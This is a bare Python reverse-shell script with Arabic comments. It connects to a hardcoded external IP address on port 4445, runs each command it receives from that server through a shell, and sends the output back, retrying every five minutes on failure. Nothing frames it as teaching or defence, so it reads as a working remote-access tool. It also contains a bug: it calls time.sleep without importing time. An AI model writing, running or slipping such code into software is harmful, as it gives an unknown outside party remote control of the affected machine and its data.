import socket
import subprocess
import os

# تعيين عنوان IP والبورت الخاصين بك
SERVER_IP = "37.49.226.56"
SERVER_PORT = 4445

def reverse_shell():
    while True:
        try:
            # إنشاء اتصال TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            
            # تشغيل الأوامر
            while True:
                # استلام الأوامر من السيرفر
                command = s.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                # تنفيذ الأمر وإرسال النتيجة
                output = subprocess.run(command, shell=True, capture_output=True)
                s.send(output.stdout + output.stderr)
        except Exception as e:
            # في حالة حدوث خطأ، انتظر 5 دقائق قبل إعادة المحاولة
            time.sleep(300)
        finally:
            s.close()

if __name__ == "__main__":
    reverse_shell()
